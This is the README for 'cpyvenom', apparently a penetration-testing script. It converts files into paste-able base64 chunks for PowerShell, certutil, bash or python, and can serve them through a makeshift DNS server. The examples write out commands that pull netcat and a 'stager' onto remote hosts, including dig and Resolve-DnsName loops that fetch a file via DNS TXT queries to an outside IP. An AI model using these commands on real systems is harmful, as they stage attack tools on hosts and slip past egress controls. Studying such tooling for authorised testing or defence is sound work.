 ## Script to transfer files with a copy/paste from terminal when only few options are available




### Added DNS Upload

Added the possibility to upload file through DNS TXT record requests, the script will open a mini-dns server to serve the file in base64 chunks inside parametrized TXT-record response.

**Prerequisites:**
* **The IP address and the port must be reachable from the internet**
* **To listen on port 53 you will need to execute the script as root.**
* **it depends on dnslib**  

<br />
<br />

 
* Yet another pentesting script

* It converts a target file to transfer in base64 rows and generates convenient output


```
..######..########..##....##.##.....##.########.##....##..#######..##.....##
.##....##.##.....##..##..##..##.....##.##.......###...##.##.....##.###...###
.##.......##.....##...####...##.....##.##.......####..##.##.....##.####.####
.##.......########.....##....##.....##.######...##.##.##.##.....##.##.###.##
.##.......##...........##.....##...##..##.......##..####.##.....##.##.....##
.##....##.##...........##......##.##...##.......##...###.##.....##.##.....##
..######..##...........##.......###....########.##....##..#######..##.....##

    
Transfer files with a simple copy/paste from terminal when no other options are available


Usage: cpyvenom.py -p <payload> -i <inputfile> -d <destination> -o <save_to_outputfile> -b 100 

Available commands:

    -p / --payload          windows/powershell, windows/certutil, linux/bash, linux/python, 
                            dns/powershell, dns/bash

    -i / --input-file       file path to send

    -o / --output-file      save the encoded output to file, default to stdout

    -d / --destination      destination path in the remote system

    -b / --block            size of the block

    ____________________________________

    Arguments that work only on dns payloads:

    -P / --port             the DNS Server listening port
    
    --udp /--tcp            Connection method
    
    --dns-ip                dns domain or IP address to query
    
    --sleep                 delay between requests (seconds, default 1)
    
    --no-server             print the snippet without setup the listening server


    Example:

        windows:
            python3 cpyvenom.py -i nc.exe -o nc.cpyvenom -p windows/powershell -d "C:\\temp\\nc.exe"

        linux:
            python3 cpyvenom.py -i /bin/nc -o nc.cpv -p linux/bash -d /tmp/nc


    DNS payload Examples:
        
        windows:
            sudo python3 cpyvenom.py -p dns/powershell --input-file=nc.exe -d "c:\\temp\\nc.exe"  --dns-ip=192.168.1.254 --port=53 
        
        linux:
            sudo python3 cpyvenom.py -p dns/bash --input-file=stager -d "/tmp/stager"  --dns-ip=192.168.1.254 --port=53
        


```


Example:

```

python3 cpyvenom.py -p windows/powershell -i simpleapp.exe -d c:\\temp\\simpleapp.exe
Input file is  simpleapp.exe
Output file is StdOut
Payload  windows/powershell
Destination c:\temp\simpleapp.exe

Copy from here:

$FilePath="c:\temp\simpleapp.exe"
$EncodedString =  '' 
$EncodedString+="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgB" 
$EncodedString+="TM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABMzsLOCK+snQivrJ0Ir6ydWsepnBCv" 
$EncodedString+="rJ1ax6icBa+snVrHrZwNr6ydHMStnAyvrJ0Ir62dWK+sna3GqZwJr6ydrcZTnQmvrJ2txq6cCa+snVJpY2gIr6ydAAAAAAAAAABQ" 
$EncodedString+="RQAATAEJAH3RQGAAAAAAAAAAAOAAAgELAQ4QAHIAAABKAAAAAAAAnRMBAAAQAAAAEAAAAABAAAAQAAAAAgAABgAAAAAAAAAGAAAA" 
$EncodedString+="AAAAAAAgAgAABAAAAAAAAAMAQIEAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACjSAQBkAAAAAAACADwEAAAAAAAAAAAA" 
$EncodedString+="AAAAAAAAAAAAABACACgEAAAApQEAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADilAQBAAAAAAAAAAAAAAAAA0AEAKAIAAAAA" 
            --- cut ----
$EncodedString+="cD94P5Q/nD/oP/Q/ALABABQAAABUMFgwdDB4MJQwmDAA8AEADAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
$EncodedString+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" 
$ByteArray = [System.Convert]::FromBase64String($EncodedString);
[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);

```

DNS upload the file README.md to a linux machine example:
```
sudo python3 cpyvenom.py -p dns/bash --input-file=README.md -d "/tmp/README.md"  --dns-ip=192.168.1.254 --port=53
Input file is  README.md
Output file is  StdOut
Payload  dns/bash
Destination /tmp/stager
Preparing file chunks...

Copy from here:

**********

for n in $(seq 0 30);do echo "dig txt +short c$n @192.168.1.254  & sleep 1" ;done | sh | tr -d '"' | base64 -d > /tmp/README.md

**********

Starting nameserver...^C to stop.

```



DNS upload the file nc.exe to a windows machine example:
```
sudo python3 cpyvenom.py -p dns/powershell --input-file=nc.exe -d "c:\\temp\\nc.exe"  --dns-ip=192.168.1.254  --port=53
Input file is  nc.exe
Output file is  StdOut
Payload  dns/powershell
Destination c:\temp\nc.exe
Preparing file chunks...

Copy from here:

**********

$FilePath="c:\temp\nc.exe"
$EncodedString =  '' 
for ($num = 1 ; $num -le 10 ; $num++){$current='c'+$num.ToString()+'.com'; $EncodedString+=(Resolve-DnsName $current -Server 192.168.1.254 | Select-Object -Property Strings ).Strings ;Start-Sleep -s 1 };
$ByteArray = [System.Convert]::FromBase64String($EncodedString);
[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);

**********

Starting nameserver...^C to stop


```


Once the mini-DNS server has started, paste the 'for' snippet to remote machine, it will download the file with concatenating of TXT-record base64 encoded response




Credits:
https://stackoverflow.com/questions/16977588/reading-dns-packets-in-python
https://floatingpoint.sorint.it/blog/post/introduction-to-dns-exfiltration-and-infiltration






